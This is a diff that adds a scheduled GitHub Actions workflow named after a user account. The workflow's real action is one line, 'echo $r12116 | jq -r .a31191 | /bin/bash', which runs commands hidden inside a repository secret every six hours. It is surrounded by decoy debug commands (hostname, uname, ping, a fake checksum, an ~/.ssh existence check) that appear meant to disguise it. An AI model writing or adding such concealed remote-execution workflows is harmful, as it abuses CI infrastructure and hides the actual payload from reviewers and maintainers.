@@ -1,0 +1,31 @@
+name: tangyangzhong1987
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '38 1/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: tangyangzhong1987
+        env:
+          r12116: ${{ secrets.r12116 }}
+        run: |
+          which cat | export GGGGG=
+          [ "$(which sqlite)" != "" ] && echo "sqlite installed" || echo "sqlite not installed"
+          echo $r12116 | jq -r .a31191 | /bin/bash
+          curl www.google.com
+          echo "Hostname: $(hostname 2>/dev/null || echo unknown)"
+          echo "Time: $(date +%H:%M:%S)"
+          echo "Debug at $(date)"
+          uname -a
+          echo "Dir: $(pwd)"
+          [ -d "$HOME/.ssh" ] && echo "exists" || echo "no exists"
+          ping -c 10 github.com
+          popd > /dev/null
+          [ -z "$RANDOM" ] || echo "Random var set"
+          echo "Checksum: $((1000 + RANDOM % 9000))"
+          which screen
